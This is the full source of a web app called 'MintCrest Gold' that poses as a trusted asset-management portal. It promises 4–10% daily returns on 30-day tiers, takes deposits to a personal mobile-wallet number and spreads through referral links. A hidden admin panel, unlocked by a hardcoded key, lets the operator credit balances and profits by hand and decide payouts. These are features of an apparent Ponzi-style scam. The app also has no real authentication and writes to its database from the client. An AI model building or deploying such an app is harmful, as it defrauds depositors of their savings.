<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Trusted Asset Management</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000205; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.5s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
        .badge-pending { @apply bg-yellow-500/10 text-yellow-500 px-2 py-1 rounded text-[7px] font-bold uppercase; }
        .badge-approved { @apply bg-green-500/10 text-green-400 px-2 py-1 rounded text-[7px] font-bold uppercase; }
        .badge-rejected { @apply bg-red-500/10 text-red-500 px-2 py-1 rounded text-[7px] font-bold uppercase; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="bg-blue-600 py-1 text-center text-[7px] font-black tracking-[0.3em] uppercase">🛡️ Institutional Grade Security | 30-Day Trading Cycles</div>

    <section id="auth-ui" class="h-full flex items-center justify-center p-6 z-[1000] absolute inset-0 bg-[#000205]">
        <div class="glass w-full max-w-sm p-12 rounded-[3.5rem] text-center border-t-4 border-blue-600">
            <h1 onclick="adminTap()" class="text-4xl font-black italic tracking-tighter mb-2 cursor-pointer">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold">Secure Asset Portal</p>
            <input type="text" id="user-name" placeholder="Full Legal Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-4 focus:border-blue-500">
            <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl">Enter Secure Vault</button>
        </div>
    </section>

    <div id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Available Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[10px] font-black text-yellow-500 uppercase tracking-widest italic animate-pulse">Checking Profit Status...</div>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20">PROFIT: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic italic">No Tier</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="changePage('wallet')" class="glass p-7 rounded-[2.5rem] text-center border-b-2 border-blue-600 active:scale-95 transition">📥 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-7 rounded-[2.5rem] text-center border-b-2 border-red-600 active:scale-95 transition">📤 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Withdraw</span></button>
            </div>
            
            <div class="glass p-6 rounded-[2.5rem] border border-white/5 text-center">
                <p id="expiry-display" class="text-[8px] opacity-40 uppercase font-black tracking-[0.2em]">All tiers expire after 30 days of activation.</p>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-500 text-xl tracking-widest">30-Day Portfolios</h2>
            <div id="plans-list" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6"><h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Activity Log</h2><div id="user-history" class="space-y-2 pb-10"></div></div>

        <div id="p-more" class="page p-6 space-y-4">
            <div class="glass p-8 rounded-[2.5rem] text-center">
                <p class="text-[8px] font-bold text-gray-500 mb-4 uppercase">Referral ID</p>
                <input type="text" id="ref-link" readonly class="w-full bg-white/5 p-4 rounded-2xl text-[10px] text-center font-bold mb-4 border border-white/5">
                <button onclick="copyRef()" class="bg-blue-600 px-10 py-3 rounded-2xl font-black text-[9px] uppercase">Copy Link</button>
            </div>
            <div class="glass p-6 rounded-[2.5rem]"><h3 class="font-black text-[10px] text-blue-500 mb-3 uppercase italic">Compliance</h3><p class="text-[9px] leading-relaxed opacity-60">MintCrest Gold Enterprise is a registered trading platform. Our 30-day cycles ensure liquidity and system stability.</p></div>
            <a href="mailto:webhub262@gmail.com" class="block w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-blue-400 uppercase">Support Contact</a>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600">
                <h3 class="font-black text-blue-500 mb-8 uppercase tracking-widest">Deposit Capital</h3>
                <div class="space-y-3 mb-10">
                    <div class="glass p-5 rounded-2xl flex justify-between items-center text-[10px] font-black text-red-500"><span>JAZZCASH</span><span>03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between items-center text-[10px] font-black text-green-500"><span>EASYPAISA</span><span>03705519562</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 mb-3 text-center font-bold">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 mb-8 text-center font-bold">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase">Verify Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600">
                <h3 class="font-black text-red-500 mb-8 text-center uppercase tracking-widest">Withdraw Profit</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 mb-3 text-center font-bold">
                <input type="text" id="wd-acc" placeholder="Account Number & Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 mb-8 text-center font-bold text-[9px]">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase">Request Payout</button>
            </div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#000205] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="text-xl font-black text-blue-500 uppercase italic">System Console</h2><button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black">LOCK</button></div>
        <div class="grid grid-cols-2 gap-4 mb-8">
            <button onclick="showAdminSection('requests')" class="glass p-5 rounded-2xl font-bold text-[10px] uppercase">Profit/Deposit Requests</button>
            <button onclick="showAdminSection('users')" class="glass p-5 rounded-2xl font-bold text-[10px] uppercase">Active Fleet</button>
        </div>
        <div id="adm-sec-requests" class="adm-sec space-y-3 mb-12"></div>
        <div id="adm-sec-users" class="adm-sec hidden space-y-3 mb-12"></div>
        <div class="glass p-8 rounded-[3rem]">
            <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-white/5 p-5 rounded-2xl mb-2 text-center text-sm font-bold border border-white/10 outline-none">
            <input type="number" id="adm-val" placeholder="Value (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-6 text-center font-bold border border-white/10 outline-none">
            <div class="grid grid-cols-2 gap-3 mb-6"><button onclick="manualEdit('balance')" class="bg-blue-600 py-4 rounded-2xl font-black text-[9px] uppercase">Add Balance</button><button onclick="manualEdit('profit')" class="bg-green-600 py-4 rounded-2xl font-black text-[9px] uppercase">Add Profit</button></div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-6 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[3.5rem]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-extrabold uppercase mt-1">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-extrabold uppercase mt-1">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-extrabold uppercase mt-1">Log</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🛡️<span class="text-[8px] font-extrabold uppercase mt-1">Legal</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;
        const plans = [
            { n: "Starter-I", p: 500, r: 4 }, { n: "Starter-II", p: 1000, r: 4 }, { n: "Starter-III", p: 1500, r: 4.5 }, { n: "Bronze-I", p: 2000, r: 4.5 }, { n: "Bronze-II", p: 3000, r: 5 }, { n: "Bronze-III", p: 4000, r: 5 }, { n: "Silver-I", p: 5000, r: 5.5 }, { n: "Silver-II", p: 7000, r: 5.5 }, { n: "Silver-III", p: 10000, r: 6 }, { n: "Gold-I", p: 15000, r: 6 }, { n: "Gold-II", p: 20000, r: 6.5 }, { n: "Gold-III", p: 25000, r: 6.5 }, { n: "Platinum-I", p: 30000, r: 7 }, { n: "Platinum-II", p: 40000, r: 7 }, { n: "Platinum-III", p: 50000, r: 7.5 }, { n: "Diamond-I", p: 60000, r: 7.5 }, { n: "Diamond-II", p: 70000, r: 8 }, { n: "Diamond-III", p: 80000, r: 8 }, { n: "Elite Master", p: 90000, r: 9 }, { n: "Royal Custody", p: 100000, r: 10 }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mintcrest_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            startCountdown();
        };

        function adminTap() { tapCount++; if(tapCount >= 3) { tapCount = 0; if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } } setTimeout(()=>tapCount=0,2000); }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mintcrest_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierExpiry: 0 });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); document.getElementById('ref-link').value = window.location.origin + "/?ref=" + name;
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { 
                if(doc.exists) { 
                    user = doc.data(); 
                    document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); 
                    document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString();
                    document.getElementById('tier-tag').innerText = user.tierName || "No Tier";
                    
                    if(user.tierExpiry > 0) {
                        const daysLeft = Math.ceil((user.tierExpiry - Date.now()) / (1000*60*60*24));
                        document.getElementById('expiry-display').innerText = `Tier expires in ${daysLeft} days.`;
                        if(daysLeft <= 0) resetTier(name);
                    }
                    checkProfitRequirement(user);
                } 
            });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-20 text-[10px] font-black uppercase">NO ACTIVITY</p>' : '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => {
                    list.innerHTML += `<div class="glass p-6 rounded-3xl flex justify-between items-center border-l-4 ${d.type==='deposit'?'border-blue-500':(d.type==='Daily Profit'?'border-green-500':'border-red-500')} mb-2 text-[10px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px] font-medium">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount.toLocaleString()}<br><span class="badge-${d.status}">${d.status}</span></div></div>`;
                });
            });
        }

        function startCountdown() {
            setInterval(() => {
                if (user && user.activeTier > 0) {
                    const nextProfit = (user.lastReqTime || user.time) + (24 * 60 * 60 * 1000);
                    const now = Date.now();
                    const diff = nextProfit - now;
                    if (diff > 0) {
                        const h = Math.floor(diff / (1000 * 60 * 60));
                        const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
                        const s = Math.floor((diff % (1000 * 60)) / 1000);
                        document.getElementById('countdown-display').innerText = `Next Profit Request: ${h}h ${m}m ${s}s`;
                    } else { document.getElementById('countdown-display').innerText = "Profit Request Sent!"; }
                } else { document.getElementById('countdown-display').innerText = "Activate Tier to Earn"; }
            }, 1000);
        }

        async function checkProfitRequirement(userData) {
            const hours24 = 24 * 60 * 60 * 1000;
            const now = Date.now();
            if (userData.activeTier > 0 && (now - userData.lastReqTime) >= hours24) {
                const dailyProfit = (userData.activeTier * userData.tierROI) / 100;
                await db.collection("requests").add({ user: userData.name, amount: dailyProfit, type: "Daily Profit", status: "pending", time: now });
                await db.collection("users").doc(userData.name).update({ lastReqTime: now });
                alert("Profit request generated automatically!");
            }
        }

        async function resetTier(name) {
            await db.collection("users").doc(name).update({ activeTier: 0, tierROI: 0, tierName: "Expired", tierExpiry: 0 });
            alert("Your 30-day tier has expired. Please renew.");
        }

        function renderPlans() { 
            const list = document.getElementById('plans-list'); list.innerHTML = ''; 
            plans.forEach(p => { 
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center active:scale-95 mb-2 cursor-pointer border-b border-white/5 transition-all"><div><h4 class="font-black text-[10px] uppercase text-blue-400">${p.n}</h4><p class="text-[9px] text-green-400 font-bold uppercase">Daily ${p.r}% for 30 Days</p></div><p class="font-black text-sm">₨ ${p.p.toLocaleString()}</p></div>`; 
            }); 
        }

        async function buy(p, roi, tierName) { 
            if(user.balance < p) { alert("Insufficient Balance."); changePage('wallet'); } 
            else { 
                const expiry = Date.now() + (30 * 24 * 60 * 60 * 1000);
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tierName, tierExpiry: expiry, lastReqTime: Date.now() }); 
                await db.collection("requests").add({ user: user.name, amount: p, type: "Tier Activation", status: "approved", time: Date.now() });
                alert(tierName + " Secured for 30 Days!"); changePage('activity');
            } 
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        async function submitDeposit() { const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; if(!a||!t) return; await db.collection("requests").add({user:user.name, amount:parseInt(a), tid:t, type:"deposit", status:"pending", time:Date.now()}); alert("Logged!"); changePage('activity'); }
        async function submitWithdraw() { const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a||!acc||a>user.balance) return; await db.collection("requests").add({user:user.name, amount:parseInt(a), acc:acc, type:"withdraw", status:"pending", time:Date.now()}); await db.collection("users").doc(user.name).update({balance:user.balance-parseInt(a)}); alert("Requested!"); changePage('activity'); }
        function copyRef() { const c = document.getElementById('ref-link'); c.select(); document.execCommand('copy'); alert("Copied!"); }

        function showAdminSection(s) { document.querySelectorAll('.adm-sec').forEach(sec=>sec.classList.add('hidden')); document.getElementById('adm-sec-'+s).classList.remove('hidden'); }
        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-2xl flex justify-between items-center border-l-4 mb-2 text-[9px] uppercase font-black"><div>${d.user}<br>₨ ${d.amount}<br>${d.type}</div><div class="flex gap-2"><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'approved', '${d.type}')" class="bg-green-600 px-5 py-2 rounded-xl">YES</button><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'rejected', '${d.type}')" class="bg-red-600 px-5 py-2 rounded-xl">NO</button></div></div>`; });
            });
            db.collection("users").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-users'); list.innerHTML = '';
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-xl flex justify-between items-center text-[9px] font-black"><div>${u.name}</div><div class="text-right">B: ${u.balance}<br>P: ${u.profit}</div></div>`; });
            });
        }

        async function handleReq(id, target, amt, action, type) {
            const ref = db.collection("users").doc(target); const d = await ref.get();
            if(action === 'approved') {
                if(type === 'deposit') await ref.update({ balance: (d.data().balance || 0) + amt });
                if(type === 'Daily Profit') await ref.update({ profit: (d.data().profit || 0) + amt, balance: (d.data().balance || 0) + amt });
            } else if(action === 'rejected' && type === 'withdraw') { await ref.update({ balance: (d.data().balance || 0) + amt }); }
            await db.collection("requests").doc(id).update({ status: action });
        }
        async function manualEdit(f) { const u = document.getElementById('adm-user').value; const v = document.getElementById('adm-val').value; const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f] || 0) + parseInt(v) }); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
    </script>
</body>
</html>
